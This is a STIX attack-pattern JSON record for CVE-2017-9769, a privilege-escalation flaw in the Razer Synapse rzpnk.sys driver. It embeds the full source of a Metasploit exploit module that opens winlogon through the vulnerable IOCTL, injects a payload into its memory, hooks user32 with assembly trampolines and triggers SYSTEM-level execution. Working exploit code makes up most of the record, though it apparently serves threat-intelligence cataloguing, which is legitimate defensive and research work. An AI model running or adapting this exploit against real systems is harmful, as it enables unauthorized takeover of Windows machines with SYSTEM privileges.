{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5b2ad76f-7adf-4238-97a4-5290cffac205",
    "created": "2024-08-14T16:49:21.928233Z",
    "modified": "2024-08-14T16:49:21.928237Z",
    "name": "Razer Synapse rzpnk.sys ZwOpenProcess",
    "description": " A vulnerability exists in the latest version of Razer Synapse (v2.20.15.1104 as of the day of disclosure) which can be leveraged locally by a malicious application to elevate its privileges to those of NT_AUTHORITY\\SYSTEM. The vulnerability lies in a specific IOCTL handler in the rzpnk.sys driver that passes a PID specified by the user to ZwOpenProcess. This can be issued by an application to open a handle to an arbitrary process with the necessary privileges to allocate, read and write memory in the specified process.  This exploit leverages this vulnerability to open a handle to the winlogon process (which runs as NT_AUTHORITY\\SYSTEM) and infect it by installing a hook to execute attacker controlled shellcode. This hook is then triggered on demand by calling user32!LockWorkStation(), resulting in the attacker's payload being executed with the privileges of the infected winlogon process. In order for the issued IOCTL to work, the RazerIngameEngine.exe process must not be running. This exploit will check if it is, and attempt to kill it as necessary.  The vulnerable software can be found here: https://www.razerzone.com/synapse/. No Razer hardware needs to be connected in order to leverage this vulnerability.  This exploit is not opsec-safe due to the user being logged out as part of the exploitation process. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/razer_zwopenprocess.rb",
            "external_id": "razer_zwopenprocess.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-9769"
        },
        {
            "source_name": "reference",
            "url": "https://warroom.securestate.com/cve-2017-9769/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex'\nrequire 'metasm'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Local::WindowsKernel\n  include Msf::Post::Windows::Priv\n\n  # the max size our hook can be, used before it's generated for the allocation\n  HOOK_STUB_MAX_LENGTH = 256\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Razer Synapse rzpnk.sys ZwOpenProcess',\n        'Description' => %q{\n          A vulnerability exists in the latest version of Razer Synapse\n          (v2.20.15.1104 as of the day of disclosure) which can be leveraged\n          locally by a malicious application to elevate its privileges to those of\n          NT_AUTHORITY\\SYSTEM. The vulnerability lies in a specific IOCTL handler\n          in the rzpnk.sys driver that passes a PID specified by the user to\n          ZwOpenProcess. This can be issued by an application to open a handle to\n          an arbitrary process with the necessary privileges to allocate, read and\n          write memory in the specified process.\n\n          This exploit leverages this vulnerability to open a handle to the\n          winlogon process (which runs as NT_AUTHORITY\\SYSTEM) and infect it by\n          installing a hook to execute attacker controlled shellcode. This hook is\n          then triggered on demand by calling user32!LockWorkStation(), resulting\n          in the attacker's payload being executed with the privileges of the\n          infected winlogon process. In order for the issued IOCTL to work, the\n          RazerIngameEngine.exe process must not be running. This exploit will\n          check if it is, and attempt to kill it as necessary.\n\n          The vulnerable software can be found here:\n          https://www.razerzone.com/synapse/. No Razer hardware needs to be\n          connected in order to leverage this vulnerability.\n\n          This exploit is not opsec-safe due to the user being logged out as part\n          of the exploitation process.\n        },\n        'Author' => 'Spencer McIntyre',\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2017-9769'],\n          ['URL', 'https://warroom.securestate.com/cve-2017-9769/']\n        ],\n        'Platform' => 'win',\n        'Targets' => [\n          # Tested on (64 bits):\n          # * Windows 7 SP1\n          # * Windows 10.0.10586\n          [ 'Windows x64', { 'Arch' => ARCH_X64 } ]\n        ],\n        'DefaultOptions' => {\n          'EXITFUNC' => 'thread',\n          'WfsDelay' => 20\n        },\n        'DefaultTarget' => 0,\n        'Privileged' => true,\n        'DisclosureDate' => '2017-03-22',\n        'Notes' => {\n          'Stability' => [ CRASH_SERVICE_RESTARTS ],\n          'SideEffects' => [ SCREEN_EFFECTS ],\n          'Reliability' => [ REPEATABLE_SESSION ],\n        },\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_md5\n              stdapi_railgun_api\n              stdapi_sys_config_driver_list\n              stdapi_sys_process_kill\n              stdapi_sys_process_memory_allocate\n              stdapi_sys_process_memory_protect\n              stdapi_sys_process_memory_read\n              stdapi_sys_process_memory_write\n            ]\n          }\n        },\n      )\n    )\n  end\n\n  def check\n    # Validate that the driver has been loaded and that\n    # the version is the same as the one expected\n    client.sys.config.getdrivers.each do |d|\n      if d[:basename].downcase == 'rzpnk.sys'\n        expected_checksum = 'b4598c05d5440250633e25933fff42b0'\n        target_checksum = client.fs.file.md5(d[:filename])\n\n        if expected_checksum == Rex::Text.to_hex(target_checksum, '')\n          return Exploit::CheckCode::Appears\n        else\n          return Exploit::CheckCode::Detected\n        end\n      end\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    if is_system?\n      fail_with(Failure::None, 'Session is already elevated')\n    end\n\n    if check == Exploit::CheckCode::Safe\n      fail_with(Failure::NotVulnerable, 'Exploit not available on this system.')\n    end\n\n    if session.platform != 'windows'\n      fail_with(Failure::NoTarget, 'This exploit requires a native Windows meterpreter session')\n    elsif session.arch != ARCH_X64\n      fail_with(Failure::NoTarget, 'This exploit only supports x64 Windows targets')\n    end\n\n    pid = session.sys.process['RazerIngameEngine.exe']\n    if pid\n      # if this process is running, the IOCTL won't work but the process runs\n      # with user privileges so we can kill it\n      print_status(\"Found RazerIngameEngine.exe pid: #{pid}, killing it...\")\n      session.sys.process.kill(pid)\n    end\n\n    pid = session.sys.process['winlogon.exe']\n    print_status(\"Found winlogon pid: #{pid}\")\n\n    handle = get_handle(pid)\n    fail_with(Failure::NotVulnerable, 'Failed to open the process handle') if handle.nil?\n    vprint_status('Successfully opened a handle to the winlogon process')\n\n    winlogon = session.sys.process.new(pid, handle)\n    allocation_size = payload.encoded.length + HOOK_STUB_MAX_LENGTH\n    shellcode_address = winlogon.memory.allocate(allocation_size)\n    winlogon.memory.protect(shellcode_address)\n    print_good(\"Allocated #{allocation_size} bytes in winlogon at 0x#{shellcode_address.to_s(16)}\")\n    winlogon.memory.write(shellcode_address, payload.encoded)\n    hook_stub_address = shellcode_address + payload.encoded.length\n\n    result = session.railgun.kernel32.LoadLibraryA('user32')\n    fail_with(Failure::Unknown, 'Failed to get a handle to user32.dll') if result['return'] == 0\n    user32_handle = result['return']\n\n    # resolve and backup the functions that we'll install trampolines in\n    user32_trampolines = {} # address => original chunk\n    user32_functions = ['LockWindowStation']\n    user32_functions.each do |function|\n      address = get_address(user32_handle, function)\n      winlogon.memory.protect(address)\n      user32_trampolines[function] = {\n        address: address,\n        original: winlogon.memory.read(address, 24)\n      }\n    end\n\n    # generate and install the hook asm\n    hook_stub = get_hook(shellcode_address, user32_trampolines)\n    fail_with(Failure::Unknown, 'Failed to generate the hook stub') if hook_stub.nil?\n    # if this happens, there was a programming error\n    fail_with(Failure::Unknown, 'The hook stub is too large, please update HOOK_STUB_MAX_LENGTH') if hook_stub.length > HOOK_STUB_MAX_LENGTH\n\n    winlogon.memory.write(hook_stub_address, hook_stub)\n    vprint_status(\"Wrote the #{hook_stub.length} byte hook stub in winlogon at 0x#{hook_stub_address.to_s(16)}\")\n\n    # install the asm trampolines to jump to the hook\n    user32_trampolines.each do |function, trampoline_info|\n      address = trampoline_info[:address]\n      trampoline = Metasm::Shellcode.assemble(Metasm::X86_64.new, %{\n        mov  rax, 0x#{address.to_s(16)}\n        push rax\n        mov  rax, 0x#{hook_stub_address.to_s(16)}\n        jmp  rax\n      }).encode_string\n      winlogon.memory.write(address, trampoline)\n      vprint_status(\"Installed user32!#{function} trampoline at 0x#{address.to_s(16)}\")\n    end\n\n    session.railgun.user32.LockWorkStation()\n    session.railgun.kernel32.CloseHandle(handle)\n  end\n\n  def get_address(dll_handle, function_name)\n    result = session.railgun.kernel32.GetProcAddress(dll_handle, function_name)\n    fail_with(Failure::Unknown, 'Failed to get function address') if result['return'] == 0\n    result['return']\n  end\n\n  # this is where the actual vulnerability is leveraged\n  def get_handle(pid)\n    handle = open_device(\"\\\\\\\\.\\\\47CD78C9-64C3-47C2-B80F-677B887CF095\", 'FILE_SHARE_WRITE|FILE_SHARE_READ', 0, 'OPEN_EXISTING')\n    return nil unless handle\n\n    vprint_status('Successfully opened a handle to the driver')\n\n    buffer = [pid, 0].pack(target.arch.first == ARCH_X64 ? 'QQ' : 'LL')\n\n    session.railgun.add_function('ntdll', 'NtDeviceIoControlFile', 'DWORD', [\n      ['DWORD', 'FileHandle', 'in' ],\n      ['DWORD', 'Event', 'in' ],\n      ['LPVOID', 'ApcRoutine', 'in' ],\n      ['LPVOID', 'ApcContext', 'in' ],\n      ['PDWORD', 'IoStatusBlock', 'out'],\n      ['DWORD', 'IoControlCode', 'in' ],\n      ['PBLOB', 'InputBuffer', 'in' ],\n      ['DWORD', 'InputBufferLength', 'in' ],\n      ['PBLOB', 'OutputBuffer', 'out'],\n      ['DWORD', 'OutputBufferLength', 'in' ],\n    ])\n    result = session.railgun.ntdll.NtDeviceIoControlFile(handle, nil, nil, nil, 4, 0x22a050, buffer, buffer.length, buffer.length, buffer.length)\n    return nil if result['return'] != 0\n\n    session.railgun.kernel32.CloseHandle(handle)\n\n    result['OutputBuffer'].unpack(target.arch.first == ARCH_X64 ? 'QQ' : 'LL')[1]\n  end\n\n  def get_hook(shellcode_address, restore)\n    dll_handle = session.railgun.kernel32.GetModuleHandleA('kernel32')['return']\n    return nil if dll_handle == 0\n\n    create_thread_address = get_address(dll_handle, 'CreateThread')\n\n    stub = %{\n      call main\n      ; restore the functions where the trampolines were installed\n      push rbx\n    }\n\n    restore.each do |function, trampoline_info|\n      original = trampoline_info[:original].unpack('Q*')\n      stub << \"mov  rax, 0x#{trampoline_info[:address].to_s(16)}\"\n      original.each do |chunk|\n        stub << %{\n          mov  rbx, 0x#{chunk.to_s(16)}\n          mov  qword ptr ds:[rax], rbx\n          add  rax, 8\n        }\n      end\n    end\n\n    stub << %{\n      pop  rbx\n      ret\n\n      main:\n      ; backup registers we're going to mangle\n      push r9\n      push r8\n      push rdx\n      push rcx\n\n      ; setup the arguments for the call to CreateThread\n      xor  rax, rax\n      push rax                                      ; lpThreadId\n      push rax                                      ; dwCreationFlags\n      xor  r9, r9                                   ; lpParameter\n      mov  r8, 0x#{shellcode_address.to_s(16)}      ; lpStartAddress\n      xor  rdx, rdx                                 ; dwStackSize\n      xor  rcx, rcx                                 ; lpThreadAttributes\n      mov  rax, 0x#{create_thread_address.to_s(16)} ; &CreateThread\n\n      call rax\n      add  rsp, 16\n\n      ; restore arguments that were mangled\n      pop  rcx\n      pop  rdx\n      pop  r8\n      pop  r9\n      ret\n    }\n    Metasm::Shellcode.assemble(Metasm::X86_64.new, stub).encode_string\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-03-22",
    "x_mitre_platforms": [
        "win'"
    ]
}